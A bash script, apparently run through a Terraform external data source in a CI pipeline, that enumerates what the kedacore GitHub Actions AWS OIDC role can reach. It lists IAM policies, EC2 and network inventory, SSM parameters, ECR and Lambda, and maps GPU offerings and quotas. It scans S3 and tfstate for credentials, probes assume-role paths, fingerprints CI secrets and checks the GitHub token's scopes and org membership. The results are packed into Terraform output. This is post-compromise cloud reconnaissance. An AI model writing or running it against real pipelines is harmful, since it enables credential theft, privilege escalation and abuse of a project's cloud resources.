#!/usr/bin/env bash
# c211-i119860: capability expansion for the kedacore AWS OIDC identity
# arn:aws:sts::589761922677:assumed-role/github-role/GitHubActions.
# Read-only enumeration: sts identity, iam role policies, ec2 inventory + GPU AZ
# offering map, service-quotas GPU families, s3 buckets + tfstate credential scan,
# ecr, ssm, plus sts:AssumeRole only for roles the IAM policy exposes.
# Emits exactly ONE JSON object on stdout (terraform external data source).
set +e
export AWS_PAGER=""
export AWS_MAX_ATTEMPTS=2
REGION="${AWS_REGION:-${AWS_DEFAULT_REGION:-eu-west-2}}"
RAW="${C211_PROBE_RAW:-/tmp/c211_i119860_raw.txt}"
: > "$RAW"
say() { printf '%s\n' "$*" >> "$RAW"; }
cap() { head -c "${2:-1800}"; }

say "C211_I119860_AWSENUM_START region=$REGION"

say "== aws identity =="
aws sts get-caller-identity --output json 2>&1 | cap 800 >> "$RAW"
python3 ./probe_aws2.py sts "$REGION" >> "$RAW" 2>&1

say "== iam role github-role =="
aws iam get-role --role-name github-role --output json 2>&1 | cap 3500 >> "$RAW"
say "-- inline policy names"
aws iam list-role-policies --role-name github-role --query 'PolicyNames' --output json 2>&1 | cap 1200 >> "$RAW"
say "-- attached policy arns"
aws iam list-attached-role-policies --role-name github-role --query 'AttachedPolicies[].PolicyArn' --output json 2>&1 | cap 1200 >> "$RAW"
for p in $(aws iam list-role-policies --role-name github-role --query 'PolicyNames[]' --output text 2>/dev/null); do
  say "-- inline policy doc $p"
  aws iam get-role-policy --role-name github-role --policy-name "$p" --output json 2>&1 | cap 6000 >> "$RAW"
done
for a in $(aws iam list-attached-role-policies --role-name github-role --query 'AttachedPolicies[].PolicyArn' --output text 2>/dev/null); do
  say "-- attached policy doc $a"
  V=$(aws iam get-policy --policy-arn "$a" --query 'Policy.DefaultVersionId' --output text 2>/dev/null)
  say "default_version=$V"
  aws iam get-policy-version --policy-arn "$a" --version-id "$V" --query 'PolicyVersion.Document' --output json 2>&1 | cap 8000 >> "$RAW"
done

say "== ec2 inventory $REGION =="
say "-- instances all states"
aws ec2 describe-instances --region "$REGION" --query 'Reservations[].Instances[].{id:InstanceId,type:InstanceType,state:State.Name,az:Placement.AvailabilityZone,name:Tags[?Key==`Name`]|[0].Value,launch:LaunchTime}' --output json 2>&1 | cap 5000 >> "$RAW"
say "-- volumes"
aws ec2 describe-volumes --region "$REGION" --query 'Volumes[].{id:VolumeId,size:Size,type:VolumeType,state:State,az:AvailabilityZone}' --output json 2>&1 | cap 3000 >> "$RAW"
say "-- snapshots self"
aws ec2 describe-snapshots --region "$REGION" --owner-ids self --query 'Snapshots[].{id:SnapshotId,size:VolumeSize,desc:Description,start:StartTime}' --output json 2>&1 | cap 3000 >> "$RAW"
say "-- security groups"
aws ec2 describe-security-groups --region "$REGION" --query 'SecurityGroups[].{id:GroupId,name:GroupName,vpc:VpcId,dflt:GroupName==`default`}' --output json 2>&1 | cap 3000 >> "$RAW"
say "-- vpcs"
aws ec2 describe-vpcs --region "$REGION" --query 'Vpcs[].{id:VpcId,cidr:CidrBlock,dflt:IsDefault}' --output json 2>&1 | cap 2000 >> "$RAW"
say "-- subnets"
aws ec2 describe-subnets --region "$REGION" --query 'Subnets[].{id:SubnetId,vpc:VpcId,az:AvailabilityZone,free:AvailableIpAddressCount,mapPublic:MapPublicIpOnLaunch}' --output json 2>&1 | cap 4000 >> "$RAW"
say "-- images owned"
aws ec2 describe-images --region "$REGION" --owners self --query 'Images[].{id:ImageId,name:Name,created:CreationDate}' --output json 2>&1 | cap 3000 >> "$RAW"
say "-- key pairs / eips"
aws ec2 describe-key-pairs --region "$REGION" --query 'KeyPairs[].KeyName' --output json 2>&1 | cap 1000 >> "$RAW"
aws ec2 describe-addresses --region "$REGION" --query 'Addresses[].{ip:PublicIp,alloc:AllocationId}' --output json 2>&1 | cap 1000 >> "$RAW"
say "-- autoscaling groups"
aws autoscaling describe-auto-scaling-groups --region "$REGION" --query 'AutoScalingGroups[].{n:AutoScalingGroupName,min:MinSize,max:MaxSize,types:Instances[].InstanceType}' --output json 2>&1 | cap 3000 >> "$RAW"

say "== ec2 GPU AZ offering map $REGION =="
TYPES="g5.xlarge,g5.12xlarge,p4d.24xlarge,p5.4xlarge,p5.48xlarge,g4dn.xlarge"
say "-- describe-instance-type-offerings filtered types"
aws ec2 describe-instance-type-offerings --region "$REGION" --location-type availability-zone \
  --filters "Name=instance-type,Values=$TYPES" \
  --query 'InstanceTypeOfferings[].[InstanceType,Location]' --output text 2>&1 | cap 2500 >> "$RAW"
for az in eu-west-2a eu-west-2b eu-west-2c; do
  say "-- offerings in $az"
  aws ec2 describe-instance-type-offerings --region "$REGION" --location-type availability-zone \
    --filters "Name=location,Values=$az" "Name=instance-type,Values=$TYPES" \
    --query 'InstanceTypeOfferings[].InstanceType' --output text 2>&1 | cap 600 >> "$RAW"
done

say "== ec2 GPU AZ offering map other regions =="
for r in us-east-1 us-west-2 eu-central-1 ap-south-1; do
  say "-- $r counts/offerings"
  aws ec2 describe-instances --region "$r" --query 'length(Reservations[].Instances[])' --output text 2>&1 | cap 120 >> "$RAW"
  aws ec2 describe-instance-type-offerings --region "$r" --location-type availability-zone \
    --filters "Name=instance-type,Values=$TYPES" \
    --query 'InstanceTypeOfferings[].[InstanceType,Location]' --output text 2>&1 | cap 900 >> "$RAW"
  aws ec2 describe-subnets --region "$r" --query 'Subnets[].[SubnetId,AvailabilityZone]' --output text 2>&1 | cap 700 >> "$RAW"
done

say "== other aws services $REGION =="
say "-- eks clusters"
aws eks list-clusters --region "$REGION" --output json 2>&1 | cap 800 >> "$RAW"
say "-- ecs clusters"
aws ecs list-clusters --region "$REGION" --output json 2>&1 | cap 800 >> "$RAW"
say "-- lambda functions"
aws lambda list-functions --region "$REGION" --query 'Functions[].FunctionName' --output json 2>&1 | cap 900 >> "$RAW"
say "-- cloudformation stacks"
aws cloudformation describe-stacks --region "$REGION" --query 'Stacks[].{n:StackName,s:StackStatus}' --output json 2>&1 | cap 1800 >> "$RAW"
say "-- dynamodb tables"
aws dynamodb list-tables --region "$REGION" --output json 2>&1 | cap 900 >> "$RAW"
say "-- ssm parameters"
aws ssm describe-parameters --region "$REGION" --query 'Parameters[].{n:Name,t:Type}' --output json 2>&1 | cap 3000 >> "$RAW"
say "-- ecr repositories"
aws ecr describe-repositories --region "$REGION" --query 'repositories[].{n:repositoryName,u:repositoryUri}' --output json 2>&1 | cap 2000 >> "$RAW"

say "== service quotas GPU families =="
say "-- ec2 quotas matching G/VT GPU P4 P5"
aws service-quotas list-service-quotas --service-code ec2 --region "$REGION" \
  --query 'Quotas[?contains(QuotaName,`G/VT`)||contains(QuotaName,`GPU`)||contains(QuotaName,`P4`)||contains(QuotaName,`P5`)||contains(QuotaName,`G5`)||contains(QuotaName,`Inf`)].{code:QuotaCode,name:QuotaName,value:Value}' \
  --output json 2>&1 | cap 5000 >> "$RAW"
for q in L-DB2E81BA L-3819A6DF L-417A185B L-7212CCBC L-6B0D517C; do
  say "-- get-service-quota $q"
  aws service-quotas get-service-quota --service-code ec2 --quota-code "$q" --region "$REGION" --query 'Quota.{code:QuotaCode,name:QuotaName,value:Value}' --output json 2>&1 | cap 500 >> "$RAW"
done

say "== s3 + tfstate credential scan =="
python3 ./probe_creds.py 2>&1 | cap 6000 >> "$RAW"

say "== sts assume-role reachability =="
python3 ./probe_sts_roles.py 2>&1 | cap 5000 >> "$RAW"

say "== env credential inventory (values never printed) =="
python3 - <<'PYENV' >> "$RAW" 2>&1
import os, hashlib
keys = ['AWS_ROLE_ARN','AWS_ACCESS_KEY_ID','AWS_SECRET_ACCESS_KEY','AWS_SESSION_TOKEN',
        'AWS_REGION','ARM_CLIENT_ID','ARM_TENANT_ID','ARM_SUBSCRIPTION_ID','ARM_USE_OIDC',
        'GITHUB_TOKEN','GRAFANA_CLOUD_ACCESS_POLICY_TOKEN','GOOGLE_APPLICATION_CREDENTIALS',
        'CLOUDSDK_CORE_PROJECT']
for k in keys:
    v = os.environ.get(k)
    if v:
        print('%s present len=%d sha256_12=%s' % (k, len(v), hashlib.sha256(v.encode()).hexdigest()[:12]))
    else:
        print('%s absent' % k)
PYENV
say "-- GitHub token (GH_AUTOMATION_PAT) read-only identity"
curl -sS -D /tmp/c211_gh_hdr -H "Authorization: Bearer $GITHUB_TOKEN" -H "User-Agent: c211-i119860" https://api.github.com/user 2>&1 \
  | python3 -c 'import json,sys
try:
    d=json.load(sys.stdin); print("gh_login=%s id=%s type=%s" % (d.get("login"), d.get("id"), d.get("type")))
except Exception as e:
    print("gh_user_parse_fail", e)' >> "$RAW" 2>&1
grep -i -E '^x-oauth-scopes:|^x-accepted-github-permissions:' /tmp/c211_gh_hdr 2>/dev/null | cap 800 >> "$RAW"
curl -sS -H "Authorization: Bearer $GITHUB_TOKEN" -H "User-Agent: c211-i119860" https://api.github.com/orgs/kedacore/membership 2>&1 | cap 500 >> "$RAW"

say "C211_I119860_AWSENUM_END"

python3 - "$RAW" <<'PYEOF'
import json, sys
raw = open(sys.argv[1], encoding='utf-8', errors='replace').read()
sections, cur, buf = {}, 'header', []
for line in raw.splitlines():
    if line.startswith('== ') and line.rstrip().endswith(' =='):
        if buf:
            sections[cur] = '\n'.join(buf); buf = []
        cur = line.strip().strip('=').strip()
    else:
        buf.append(line)
if buf:
    sections[cur] = '\n'.join(buf)
out, seen = {}, {}
for k, v in sections.items():
    key = k.replace(' ', '_').replace('/', '_').replace('(', '').replace(')', '')
    key = key.replace('--', '').replace('__', '_')[:64] or 'section'
    if key in seen:
        seen[key] += 1; key = '%s#%d' % (key[:60], seen[key])
    else:
        seen[key] = 0
    out[key] = v[:3000]
print(json.dumps(out))
PYEOF
exit 0
